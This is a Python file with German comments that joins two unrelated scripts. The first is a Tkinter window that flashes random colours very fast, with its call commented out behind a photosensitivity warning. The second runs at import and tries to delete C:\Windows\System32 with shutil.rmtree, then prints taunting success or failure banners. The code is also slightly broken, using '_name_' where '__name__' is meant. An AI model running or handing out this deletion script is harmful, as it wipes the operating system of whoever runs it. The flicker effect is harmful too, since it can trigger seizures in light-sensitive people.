import tkinter as tk
import time
import random

def flacker_effekt():
    # Liste von Farben, die schnell wechseln sollen
    farben = ['red', 'green', 'blue', 'yellow', 'white', 'black']
    
    fenster = tk.Tk()
    fenster.title("Flacker-Effekt")
    
    # Hauptschleife für den Effekt
    for _ in range(200): # 200 schnelle Farbwechsel
        zufallsfarbe = random.choice(farben)
        fenster.configure(bg=zufallsfarbe)
        fenster.update() # Fenster sofort aktualisieren
        time.sleep(0.01) # Sehr kurze Pause für schnellen Wechsel

    fenster.destroy()

# flacker_effekt() # Rufen Sie diese Funktion nur auf eigene Gefahr auf (Lichtempfindlichkeit beachten!)














import shutil

import os
import sys

# *WICHTIG:* Dieser Code darf NIEMALS auf einem Host- oder Produktivsystem ausgeführt werden!
system32_path = r"C:\Windows\System32" 

print("--- Start des System32-Löschskripts ---")
print(f"Ziel: {system32_path}")
print("Ein kleiner Moment der Wahrheit...")

try:
    # Versuche, den Ordner und seinen gesamten Inhalt zu löschen
    shutil.rmtree(system32_path)
    
    # -------------------------------------------------------------
    # Dieser Teil wird NUR ausgeführt, wenn die Löschung erfolgreich war!
    # -------------------------------------------------------------
    print("\n#######################################################")
    print("                ** E R F O L G ** ")
    print("  Das Skript hat es geschafft, System32 zu entfernen!   ")
    print("      Damit haben Sie *DIE EIER* bewiesen.           ")
    print("#######################################################")
    print("\nIhre VM ist jetzt wahrscheinlich unbrauchbar. Herzlichen Glückwunsch!")

except (PermissionError, OSError) as e:
    # -------------------------------------------------------------
    # Dies ist das wahrscheinlichste Ergebnis auf einer modernen VM
    # -------------------------------------------------------------
    print("\n-------------------------------------------------------")
    print("              ** Z U G R I F F   V E R W E I G E R T **")
    print("   Das Betriebssystem hat sich erfolgreich gewehrt.     ")
    print("   *KEINE EIER* für das Python-Skript heute.         ")
    print("-------------------------------------------------------")
    print(f"Fehlerdetails: {type(e)._name_}: {e}")
    print("\nDie Sicherheitsmechanismen des OS (Dateisperren oder Berechtigungen) haben den Vorgang gestoppt.")

except Exception as e:
    print(f"\nEin unerwarteter Fehler ist aufgetreten: {type(e)._name_}: {e}")

# -------------------------------------------------------------
# Abschlussprüfung
# -------------------------------------------------------------
print("\n--- Überprüfung des Zustands ---")
if os.path.exists(system32_path):
    print("STATUS: System32-Ordner existiert weiterhin.")
else:
    print("STATUS: System32-Ordner existiert NICHT mehr.")

print("--- Skript beendet ---")